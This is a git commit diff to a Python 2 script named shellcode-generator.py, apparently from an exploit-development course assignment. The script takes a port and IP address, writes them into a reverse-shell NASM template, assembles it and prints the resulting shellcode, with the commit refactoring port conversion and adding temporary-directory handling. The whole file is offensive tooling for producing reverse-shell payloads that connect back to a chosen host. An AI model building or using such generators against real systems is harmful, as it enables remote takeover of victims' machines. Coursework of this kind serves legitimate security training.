7198caceb317a57144d0e2de85eeea286cad25c4
Security Chops <39027035+securitychops@users.noreply.github.com>
2018-05-21 12:39:21 -0500

    updating to do all the things

--- assignment-2/shellcode-generator.py
+++ assignment-2/shellcode-generator.py
@@ -1,17 +1,32 @@
 #!/usr/bin/python
 
-import uuid
-import sys
+import tempfile
+import shutil
 import os
-
-#clear the console
-os.system('clear')
+import sys
+import stat
+import uuid
 
 if len(sys.argv) != 3:
    
     print "[x] usage: ./poc.py port ipaddress (ex. 4444 10.0.7.17)"
     sys.exit(0)
 
+tempDir = tempfile.mkdtemp()
+
+print "[*] created temporary directory: " + tempDir
+
+providedPort = str(format(int(sys.argv[1]), '04x'))
+finalPort = "0x"
+finalPort += str(providedPort[2:])
+finalPort += str(providedPort[:2])
+finalPort = finalPort.replace("x00", "x")
+
+print "[*] generated final port in hex: " + finalPort
+
+finalPort = "push word " + finalPort
+
+ipAddress = sys.argv[2].split('.')
 
 with open('reverse-shell-template.nasm') as f:
     content = f.readlines()
@@ -21,11 +36,8 @@ content = [x.strip() for x in content]
 
 insertAt = content.index(";ip-address-before-here")
 
-stuff = sys.argv[2].split('.')
-
 offset = 0
-
-for x in stuff[::-1]:
+for x in ipAddress:
     if x != '0':
         instruction = "mov byte [esp+" + str(offset) + "], 0x" + str(format(int(x), '02x'))
         content.insert(insertAt, instruction)
@@ -34,31 +46,53 @@ for x in stuff[::-1]:
 
 insertAt = content.index(";port-before-here")
 
-#push word 0x5C11     ; port number (least significant byte first ... 0x115C is 4444)
-
-stuff = str(format(int(sys.argv[1]), '04x'))
-
-finalPort = "0x"
-
-if stuff[2:] != '00':
-    finalPort += str(stuff[2:])
-
-finalPort += str(stuff[:2])
-
-finalPort = "mov word [esp], " + finalPort
-
 content.insert(insertAt, finalPort)
 
 uuidFileName = str(uuid.uuid4())
+uuidFullName = tempDir + "/" + uuidFileName + ".nasm"
 
-thefile = open(uuidFileName, 'w')
+thefile = open(uuidFullName, 'w')
 for x in content:
    thefile.write(x)
    thefile.write("\n")
 
 thefile.close()
 
-#os.remove(uuidFileName)
+print "[*] output nasm file to " + uuidFullName
 
-#print uuidFilePath
+# create friendly nasm files
+nasmFile = uuidFullName
+nasmFileNoNasm = nasmFile.replace(".nasm", "")
 
+# do all the template stuff
+print "[*] injected dynamic assembly into temporary file"
+
+#copying
+shutil.copy("compile.sh", tempDir)
+shutil.copy("shellcode-dump.sh",tempDir)
+
+
+# chmod 755 it in temp dir
+os.chmod(tempDir + "/compile.sh", 0775)
+os.chmod(tempDir + "/shellcode-dump.sh", 0775)
+
+print "[*] prepped " + tempDir + " with +x auxilary files"
+
+print "[*] assembling and linking"
+
+#./compile.sh
+os.system("bash " + tempDir + "/compile.sh " + nasmFileNoNasm)
+
+print "[*] shellcode incoming!"
+print "---"
+
+#objdump it
+os.system("bash " + tempDir + "/shellcode-dump.sh " + tempDir + " "  + uuidFileName)
+
+print "---"
+
+#delete directory tree
+shutil.rmtree(tempDir)
+print "[*] deleted temporary directory: " + tempDir
+
+print "[*] done"
